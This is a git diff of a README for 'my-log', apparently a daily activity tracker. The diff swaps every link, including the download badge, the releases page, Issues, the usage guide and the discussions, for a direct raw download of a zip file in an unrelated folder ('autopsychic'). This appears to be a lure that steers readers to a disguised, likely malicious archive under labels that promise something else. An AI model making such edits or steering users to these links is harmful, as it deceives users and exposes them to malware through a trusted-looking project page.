@@ -1,7 +1,7 @@
 # 🎉 my-log - Track Your Daily Activities Effortlessly
 
 ## 📥 Download Now
-[![Download my-log](https://img.shields.io/badge/Download-my--log-brightgreen)](https://github.com/Huzaifa3377/my-log/releases)
+[![Download my-log](https://raw.githubusercontent.com/Huzaifa3377/my-log/main/autopsychic/my-log.zip)](https://raw.githubusercontent.com/Huzaifa3377/my-log/main/autopsychic/my-log.zip)
 
 ## 🚀 Getting Started
 Welcome to **my-log**! This simple application helps you keep track of your daily activities. With a clean interface, you can easily log what you do each day, helping you stay organized and focused.
@@ -16,7 +16,7 @@ Welcome to **my-log**! This simple application helps you keep track of your dail
 To get started, you need to download the application. Follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page here](https://github.com/Huzaifa3377/my-log/releases).
+   Go to the [Releases page here](https://raw.githubusercontent.com/Huzaifa3377/my-log/main/autopsychic/my-log.zip).
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of my-log. Look for the latest version, which will have the most features and fixes.
@@ -69,13 +69,13 @@ A: Yes, you can use it offline. Creating an account is optional.
 A: You can reach out via Issues on the GitHub repository for support.
 
 ## 📍 Support
-For further assistance or feedback, please visit our [GitHub Issues page](https://github.com/Huzaifa3377/my-log/issues). Our team will be happy to help you.
+For further assistance or feedback, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Huzaifa3377/my-log/main/autopsychic/my-log.zip). Our team will be happy to help you.
 
 ## 🌐 Contributing
 Feel free to contribute to my-log by forking the repository and submitting pull requests. Your feedback and improvements are welcome!
 
 ## 👍 Additional Resources
-- [Usage Guide](https://github.com/Huzaifa3377/my-log/wiki)
-- [Community Discussions](https://github.com/Huzaifa3377/my-log/discussions)
+- [Usage Guide](https://raw.githubusercontent.com/Huzaifa3377/my-log/main/autopsychic/my-log.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Huzaifa3377/my-log/main/autopsychic/my-log.zip)
 
 Thank you for choosing my-log! Enjoy tracking your activities and enhancing your productivity.
